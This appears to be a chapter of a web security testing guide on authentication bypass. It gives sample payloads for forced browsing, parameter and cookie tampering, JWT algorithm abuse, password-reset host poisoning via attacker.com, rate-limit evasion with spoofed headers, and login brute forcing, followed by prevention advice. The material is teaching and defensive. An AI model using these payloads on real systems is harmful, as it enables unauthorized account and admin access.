# Authentication Bypass

Authentication bypass vulnerabilities allow attackers to circumvent the authentication process and access privileged functionality or data without proper credentials.

## Types of Authentication Bypass

### 1. Direct Page Access
Accessing restricted pages directly without login.
```bash
curl https://target.com/admin/
curl https://target.com/dashboard/
curl https://target.com/internal/
```
Many applications only hide links without protecting endpoints.

### 2. Parameter Manipulation

**Login bypass via parameters:**
```http
POST /login HTTP/1.1
username=admin&password=anything&is_admin=true

POST /api/auth HTTP/1.1
{"username":"admin","password":"test","role":"admin"}
```

**Email verification bypass:**
```http
POST /verify HTTP/1.1
email=user@target.com&verified=true
```

### 3. Cookie & Token Manipulation

**Cookie modification:**
```
Cookie: admin=true
Cookie: logged_in=1
Cookie: role=admin
Cookie: user=admin
```

**JWT manipulation (see JWT Attacks section):**
- Change algorithm to `none`
- Change algorithm from `RS256` to `HS256`
- Modify payload claims (`sub`, `role`, `admin`)

### 4. Forced Browsing

**Directory traversal to admin endpoints:**
```
GET /admin/panel
GET /../admin/
GET /%2e%2e/admin/
GET /ADMIN/
```

### 5. Weak Password Reset

**Token prediction:**
```
Token based on timestamp, email hash, or sequential
GET /reset?token=12345
GET /reset?token=12346
```

**Host manipulation:**
```
POST /forgot HTTP/1.1
Host: attacker.com
email=admin@target.com
# Reset link sent to attacker.com
```

### 6. Rate Limiting Bypass

```bash
# IP rotation
curl -X POST https://target.com/login --proxy http://proxy1:port
curl -X POST https://target.com/login --proxy http://proxy2:port

# Header spoofing
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1

# Cookie-based rate limiting
Cookie: rate_limit_bypass=true
```

### 7. Race Condition (TOCTOU)

```javascript
// Send multiple login requests simultaneously
for (let i = 0; i < 100; i++) {
    fetch("/login", {method: "POST", body: "username=admin&password=guess"});
}
```

### 8. OAuth Misconfiguration

- **Improper redirect_uri validation** — Use open redirect to steal tokens
- **CSRF on OAuth flow** — No `state` parameter
- **Token leakage** — Token in referrer header
- **Replay attack** — Reuse authorization code

## Testing Methodology

1. **Enumerate all endpoints** — Map everything, including JS-discovered routes
2. **Identify access control** — Determine which endpoints require auth
3. **Test without auth** — Try each endpoint without cookies/tokens
4. **Test with modified auth** — Change user IDs, roles, tokens
5. **Test HTTP methods** — `GET` vs `POST` vs `PUT` vs `DELETE` may have different auth
6. **Test for direct object references** — Bypass + IDOR combination

## Tools

- **Burp Suite** — Repeater, Intruder, Sequencer
- **ffuf** — Directory discovery for hidden endpoints
- **JWT_Tool** — JWT manipulation
- **Auth-analyzer** (Burp extension)
- **Autorize** (Burp extension for ATO detection)

## Prevention

1. **Server-side access control** on every endpoint
2. **Role-based access control** (RBAC) with deny-by-default
3. **Strong session management** — Secure, HTTPOnly, SameSite cookies
4. **Rate limiting** on auth endpoints with IP + user-based limits
5. **JWT with proper validation** (algorithm restriction, signature verification)
6. **OAuth with state parameter** and strict redirect_uri validation

---

> **Next**: [Business Logic Vulnerabilities](08-business-logic.md)
